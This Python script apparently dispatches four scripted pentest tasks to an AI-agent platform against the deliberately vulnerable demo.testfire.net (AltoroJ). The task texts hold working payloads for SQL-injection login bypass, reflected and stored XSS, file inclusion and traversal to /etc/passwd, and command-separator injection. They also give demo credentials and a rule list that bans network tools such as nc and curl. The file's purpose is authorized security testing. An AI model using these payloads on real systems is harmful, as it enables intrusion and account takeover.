#!/usr/bin/env python3
"""全力轮：按攻击面拆成 4 个并行任务，每个带源码级交接清单（文件:行号 + payload + 判定标准）。
放宽边界：允许提交一次 feedback 表单（官方靶场，用于验证存储型 XSS 与 INSERT 注入）。"""
import json, subprocess, sys, os, urllib.request, urllib.error

BASE = "http://127.0.0.1:8787"
HERE = os.path.dirname(os.path.abspath(__file__))

def token():
    return subprocess.check_output(
        [sys.executable, os.path.join(HERE, "mktoken.py")], text=True).strip()

ENV_NOTE = """【执行环境 — 必读，违反会直接失败】
本机 Windows，shell 工具实际执行 PowerShell 5.1，不是 bash：
- 禁止 curl / wget / nc / nmap / sqlmap；禁止管道、重定向、&& 等 bash 语法。
- 发 HTTP 一律用 python。需要 POST / 带 Cookie / 看响应头时，**写成临时 .py 文件再执行**（引号嵌套在 PowerShell 里极易出错）。
- 登录并维持会话的标准写法（照抄即可）：
    import urllib.request, urllib.parse, http.cookiejar
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}), urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))
    r = op.open(urllib.request.Request('http://demo.testfire.net/doLogin',
        data=urllib.parse.urlencode({'uid':'jsmith','passw':'demo1234'}).encode()))
    print(r.status, len(r.read()))
- **协议只用 http://**（本机代理对 https 隧道不稳）。若报 "Tunnel connection failed" 或 502，
  用 op = urllib.request.build_opener(urllib.request.ProxyHandler({})) 显式绕过代理。
- 单条命令控制在 60 秒内返回。
- 已知账号：jsmith/demo1234（普通用户）、admin/admin（管理员）。"""

BOUNDARY = """【边界（本轮已放宽）】
- 只允许访问 demo.testfire.net。
- 允许：只读探测、登录、带 payload 的验证性请求。
- **特别放宽**：允许提交 **1 次** feedback 表单（POST /sendFeedback）用于验证存储型 XSS 与 INSERT 注入，
  字段名必须是 cfile=comments.txt & name & email_addr & subject & comments（注意是 email_addr 不是 email）。
- 禁止：注册新用户、改密码、真实转账、删改他人数据、暴力破解、DoS、上传文件、批量灌数据。"""

RULES = """【硬性交付要求 —— 验收标准】
- 每条【先发 baseline（正常值）再发 payload】，两段真实输出都要贴进 evidence（完整 URL、状态码、响应关键片段原文）。
- 复现成功【立即 report_finding】：vulnclass / name / severity(critical|high|medium|low) / summary / evidence。
- 清单【每一条】都必须给出明确结论（登记 or 写明"未复现"+原因），不许跳过、不许合并。
- 全部处理完后调用 list_findings 复核。
- 【只有清单所有条目都给出结论之后】才允许判定目标达成。中途绝对不得收官，
  不要因为"已经找到几条了"或"觉得差不多了"就结束 —— 这是硬性要求。"""

# ────────────────────────────────────────────────────────────
FACES = [
{
 "tag": "A-SQL注入",
 "name": "AltoroJ 全力轮 A：SQL 注入全量（DBUtil 拼接点）",
 "goal": ("对 demo.testfire.net 的 SQL 注入面做穷尽测试：覆盖 DBUtil.java 全部用户输入拼接点"
          "（:219 登录、:242 USER_ID 查询、:276 USERID 账户列表、:451 accountNo、:519 feedback INSERT、"
          ":494/:482 注册 INSERT、:506 改密 UPDATE、:335/:345 转账），"
          "每条先 baseline 后 payload，确认后逐条 report_finding 登记。"),
 "list": """【源码级清单 A：SQL 注入 — DBUtil.java 拼接点，逐条独立复现】

A1) 登录绕过（源码 DBUtil.java:219）
    SELECT COUNT(*) FROM PEOPLE WHERE USER_ID='<uid>' AND PASSWORD='<passw>'
    POST /doLogin  body: uid=jsmith' OR '1'='1&passw=anything
    判定：是否跳过密码校验直接登录成功（响应出现 Welcome / Sign Off）

A2) 用户信息查询（DBUtil.java:242）SELECT ... FROM PEOPLE WHERE USER_ID='<username>'
    登录后找触发 USER_ID 查询的入口（/bank/main.jsp、账户页、/bank/showAccount 等），注入单引号
    判定：500 + Derby/SQL 语法错误 或响应差异

A3) 账户列表查询（DBUtil.java:276）... WHERE USERID='<username>'
    登录后 /bank/showAccount?listAccounts=1'  及变体
    判定：SQL 报错 / 500 与 baseline 差异

A4) 账户余额查询（DBUtil.java:451）... WHERE ACCOUNT_ID=<accountNo>
    登录后 /bank/showAccount?accountNo=1'   以及 accountNo=1 OR 1=1
    判定：500 + SQL 语法错误

A5) 交易日期查询（DBUtil.java:399 一带）
    登录后 /bank/showTransactions?startDate=1'&endDate=2026-01-01
    判定：500 + SQL 语法错误

A6) feedback INSERT 注入（DBUtil.java:519）
    INSERT INTO FEEDBACK (NAME,EMAIL,SUBJECT,COMMENTS) VALUES ('<name>',...)
    POST /sendFeedback  cfile=comments.txt&name=gt'&email_addr=a@b.c&subject=s&comments=c
    **本轮允许提交 1 次**。判定：是否出现 SQL 错误；若页面正常返回但数据落库，
    说明是【盲注/二阶】——如实记录为 "inferred" 并说明证据强度，不要编造成 confirmed。

A7) 注册 INSERT 注入（DBUtil.java:494 与 :482）
    只做参数层面分析，**不要真的注册用户**；说明该点是否存在拼接、你是否能验证。

A8) 改密 UPDATE 注入（DBUtil.java:506）
    UPDATE PEOPLE SET PASSWORD='<password>' WHERE USER_ID='<username>'
    同样只做参数层面分析，**不要真的改密码**。

A9) 转账相关（DBUtil.java:335/:345/:351）
    只做参数层面分析，**不要真的发起转账**。"""
},
{
 "tag": "B-XSS",
 "name": "AltoroJ 全力轮 B：XSS 全量（反射 + 存储）",
 "goal": ("对 demo.testfire.net 的跨站脚本面做穷尽测试：反射型覆盖 5 处未过滤输出点"
          "（customize.jsp:44、queryxpath.jsp:36、transaction.jsp:126 与 :128、serverStatusCheckService.jsp:4），"
          "存储型验证 feedback 提交后在 feedbacksuccess.jsp / admin/feedbackReview.jsp 的原样渲染；"
          "每条先 baseline 后 payload，确认后逐条 report_finding 登记。"),
 "list": """【源码级清单 B：XSS — 逐条独立复现】

B1) 反射 XSS · lang（bank/customize.jsp:44）
    登录后 GET /bank/customize.jsp?lang=<script>alert(1)</script>（URL 编码 %3Cscript%3E...）
    判定：响应中原样出现 <script>alert(1)</script>（未 HTML 转义）

B2) 反射 XSS · query（bank/queryxpath.jsp:36）
    登录后 GET /bank/queryxpath.jsp?query=<script>alert(1)</script>
    判定：input value 属性里原样回显；顺带测 XPath 注入特征（query 带 ' 或 ] 的报错差异）

B3) 反射 XSS · startDate（bank/transaction.jsp:126）
    登录后 GET /bank/transaction.jsp?startDate=<script>alert(1)</script>
    判定：input value 中原样回显

B4) 反射 XSS · endDate（bank/transaction.jsp:128）  ← 与 B3 是**两个独立参数**，必须分别测
    登录后 GET /bank/transaction.jsp?endDate=<script>alert(1)</script>
    判定：同上

B5) 反射 XSS · HostName（util/serverStatusCheckService.jsp:4，JSON 输出）
    GET /util/serverStatusCheckService.jsp?HostName=<script>alert(1)</script>
    判定：JSON 响应里原样出现；注意这里是 JSON 上下文，如实说明可利用条件

B6) **存储型 XSS（重点，前几轮从没测过）**
    源码：feedback 提交走 DBUtil.java:519 INSERT 拼接，**展示页 feedbacksuccess.jsp:74-82 与
    admin/feedbackReview.jsp:47-63 用 <%= %> 直接输出 name/email/subject/comments，无任何转义**。
    POST /sendFeedback  body: cfile=comments.txt&name=<script>alert('STORED')</script>&email_addr=x@y.z&subject=s&comments=c
    **本轮允许提交 1 次**。
    判定：提交后的成功页（feedbacksuccess.jsp）是否原样渲染 <script>alert('STORED')</script>；
    再用新会话 GET /admin/feedbackReview.jsp 看是否也渲染（那是越权 + 存储 XSS 的组合）。

B7) 输出编码检查
    看上述各点是否做了 HTML 转义；若某点已被转义，如实记为"未复现"，不要勉强登记。"""
},
{
 "tag": "C-文件包含",
 "name": "AltoroJ 全力轮 C：本地文件包含 / 路径遍历 / 命令注入",
 "goal": ("对 demo.testfire.net 的 index.jsp content 参数做穷尽测试：验证本地文件包含能否读到"
          "Web 根目录下的 jsp 源码、能否穿越到 WEB-INF 与系统文件，并分析 advancedStaticPageProcessing"
          "开启时的 OS 命令注入分支；每条先 baseline 后 payload，确认后逐条 report_finding 登记。"),
 "list": """【源码级清单 C：文件包含 / 遍历 / 命令注入】

C1) 本地文件包含（index.jsp:34→97→101）
    源码：content = "static/" + request.getParameter("content")，然后 <jsp:include page="<%=content%>"/>
    **无任何白名单或路径校验**。
    baseline: GET /index.jsp?content=inside.htm  （应 200，约 8KB 正常页）
    payload 1: GET /index.jsp?content=..%2flogin.jsp      → 已知会 200 且返回约 15KB（读到 login.jsp 渲染结果）
    payload 2: GET /index.jsp?content=..%2findex.jsp      → 已知会 200 且返回超大响应（递归自包含）
    payload 3: GET /index.jsp?content=..%2f..%2fWEB-INF%2fweb.xml   → 已知 500（Tomcat 对 WEB-INF 有保护）
    判定：payload 相对 baseline 的状态码与响应体差异；能读到 Web 根目录下任意 jsp 即构成 LFI，
    请如实区分"能读到源码"（强证据）与"仅状态码变化"（弱证据），不要夸大。

C2) 路径遍历变体
    ../ 、..\\ 、....// 、..%2f 、%2e%2e%2f 、..%252f（双重编码）、绝对路径 /etc/passwd 等
    逐个记录状态码与响应长度，找出能用的一类。

C3) OS 命令注入（index.jsp:56 / :62 → Runtime.getRuntime().exec）
    源码：当 app.properties 里 advancedStaticPageProcessing=true 时走命令分支：
      Windows: command = "type \\"" + path + "\\\\" + content + "\\""   经 cmd /c 执行
      Linux:   command = "cat " + path + "/" + content                  经 bash -c 执行
    **该选项在 app.properties 里是被注释掉的（默认关闭）**。
    请尝试用 content 参数注入命令分隔符（如 & 、| 、; 、$( ) ）并观察响应是否出现命令执行迹象
    （如能回显系统命令输出）。
    **如实报告**：若线上确认走的是 jsp:include 分支（命令分支未启用），
    就把 C3 记为"代码存在缺陷但当前配置下不可达"，severity 标 low 或写明 not-applicable，
    **不要**把它登记成可利用的高危命令注入。

C4) 目录列出 / 敏感文件
    试 /static/ 、/WEB-INF/ 、/META-INF/ 、/robots.txt 、/.git/ 等，记录 200/403/404。"""
},
{
 "tag": "D-访问控制",
 "name": "AltoroJ 全力轮 D：访问控制 / 越权 / 配置与头部安全 / CSRF",
 "goal": ("对 demo.testfire.net 的访问控制与安全配置面做穷尽测试：后台未授权与越权、水平越权（改 accountNo 看他人账户）、"
          "安全响应头缺失、Swagger 暴露、详细错误页信息泄露、CSRF token 缺失、Cookie 属性；"
          "每条先 baseline 后 payload，确认后逐条 report_finding 登记。"),
 "list": """【源码级清单 D：访问控制 / 配置安全】

D1) 后台未授权访问
    源码：web.xml 里 /admin/* 只是 servlet-mapping，**没有 <security-constraint>**；
    admin/admin.jsp 有代码级校验，但 **admin/feedbackReview.jsp 源码里没有任何会话/角色校验**。
    baseline（未登录）: GET /admin/login.jsp
    payload: 未登录 GET /admin/admin.jsp 、/admin/feedbackReview.jsp
    再以 jsmith（普通用户）登录后访问同样的 URL
    判定：是否 200 且返回后台内容；普通用户能看到即水平/垂直越权

D2) 水平越权（改账号看他人数据）
    登录后 /bank/showAccount?accountNo=<换成别人的账号 id>，看能否读到他人余额/交易
    已知账号 jsmith（普通）、admin；尝试遍历几个 accountNo 观察返回差异

D3) 安全响应头缺失（实测响应头）
    GET http://demo.testfire.net/  打印全部响应头
    逐项确认缺失：X-Frame-Options（点击劫持）、Content-Security-Policy、
    X-Content-Type-Options、Strict-Transport-Security、X-XSS-Protection
    已知实测：以上 5 项全部缺失；Server 头泄露 Apache-Coyote/1.1
    按项分别 report_finding（可合并为 1-2 条，但要列全缺了哪些）

D4) API 文档暴露
    GET /swagger/ 及常见路径（/swagger/index.html、/swagger/ui/、/api/ 等）
    判定：是否 200 且泄露接口清单

D5) 详细错误页信息泄露
    触发 500（如 /bank/showAccount?accountNo=1'），看错误页是否泄露堆栈 / SQL / 框架版本

D6) CSRF
    源码全站**没有任何 csrf token**（已 grep 确认）。
    看 /bank/transfer.jsp 或 doTransfer 的表单里是否存在不可预测的 token；
    若没有，构造说明：攻击者可诱导已登录用户发起转账。**不要真的发起转账**。
    判定为"表单无 CSRF token"，如实登记。

D7) Cookie 属性
    看 JSESSIONID 的 Set-Cookie：已知有 HttpOnly；确认是否缺 Secure（站点是 http，Secure 本就不适用，
    如实说明）。"""
},
]

def main():
    tok = token()
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    for f in FACES:
        desc = f"{ENV_NOTE}\n\n{BOUNDARY}\n\n{f['list']}\n\n{RULES}"
        body = {
            "name": f["name"],
            "description": desc,
            "goal": f["goal"],
            "company_ids": [3],
            "seed_first_intent": True,
            "coverage_enabled": True,
            "timeout_seconds": 7200,
        }
        data = json.dumps(body, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(BASE + "/api/tasks", data=data, method="POST",
            headers={"Authorization": "Bearer " + tok, "Content-Type": "application/json; charset=utf-8"})
        try:
            with opener.open(req, timeout=30) as r:
                print(f"[{f['tag']}] HTTP {r.status}", r.read().decode("utf-8", "ignore")[:180])
        except urllib.error.HTTPError as e:
            print(f"[{f['tag']}] HTTP {e.code}", e.read()[:300].decode("utf-8", "ignore"))
        except Exception as e:
            print(f"[{f['tag']}] ERR", type(e).__name__, str(e)[:200])

if __name__ == "__main__":
    main()
